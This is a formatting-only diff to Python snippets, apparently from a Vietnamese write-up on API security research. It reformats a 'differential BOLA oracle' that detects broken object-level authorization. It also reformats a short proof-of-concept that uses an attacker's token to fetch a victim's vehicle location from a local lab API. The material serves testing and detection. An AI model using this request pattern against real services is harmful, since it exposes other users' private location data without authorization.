@@ -34,17 +34,18 @@ graph TD
 import json
 from typing import Dict, Any, Tuple
 
+
 def differential_bola_oracle(
-    r_owner: Dict[str, Any],     # Request hợp lệ của nạn nhân
-    r_cross: Dict[str, Any],     # Request vượt quyền của kẻ tấn công
+    r_owner: Dict[str, Any],  # Request hợp lệ của nạn nhân
+    r_cross: Dict[str, Any],  # Request vượt quyền của kẻ tấn công
     r_attacker: Dict[str, Any],  # Request hợp lệ của kẻ tấn công
-    sensitive_keys: set
+    sensitive_keys: set,
 ) -> Tuple[bool, float, str]:
-    
+
     # 1. Điều kiện tiên quyết: Request chéo phải thành công
     if r_cross.get("status_code") != 200:
         return False, 0.0, "Cross-request failed (not 200)"
-        
+
     # 2. Loại bỏ các trường động gây nhiễu
     dynamic_noise = {"timestamp", "date", "trace_id", "request_id", "nonce", "server_time"}
     clean_owner = {k: v for k, v in r_owner.get("body", {}).items() if k not in dynamic_noise}
@@ -60,10 +61,16 @@ def differential_bola_oracle(
     similarity = matching_values / len(matching_keys)
 
     # 4. Kiểm tra việc rò rỉ dữ liệu định danh riêng của nạn nhân
-    leaked_sensitive = [k for k in sensitive_keys if k in clean_cross and clean_cross[k] == clean_owner.get(k)]
+    leaked_sensitive = [
+        k for k in sensitive_keys if k in clean_cross and clean_cross[k] == clean_owner.get(k)
+    ]
 
     if similarity >= 0.85 and leaked_sensitive:
-        return True, similarity, f"Confirmed BOLA: Leaked {leaked_sensitive} with similarity {similarity:.2f}"
+        return (
+            True,
+            similarity,
+            f"Confirmed BOLA: Leaked {leaked_sensitive} with similarity {similarity:.2f}",
+        )
 
     return False, similarity, "Similarity insufficient or no sensitive data leaked"
 ```
@@ -85,10 +92,7 @@ ATTACKER_TOKEN = "eyJhbGciOiJIUzI1NiIsIn..."
 VICTIM_VEHICLE_ID = "c636f1b1-2292-4f32-845f-4d9435b5a796"
 URL = f"http://localhost:8888/identity/api/v2/vehicle/{VICTIM_VEHICLE_ID}/location"
 
-headers = {
-    "Authorization": f"Bearer {ATTACKER_TOKEN}",
-    "Accept": "application/json"
-}
+headers = {"Authorization": f"Bearer {ATTACKER_TOKEN}", "Accept": "application/json"}
 
 response = requests.get(URL, headers=headers)
 
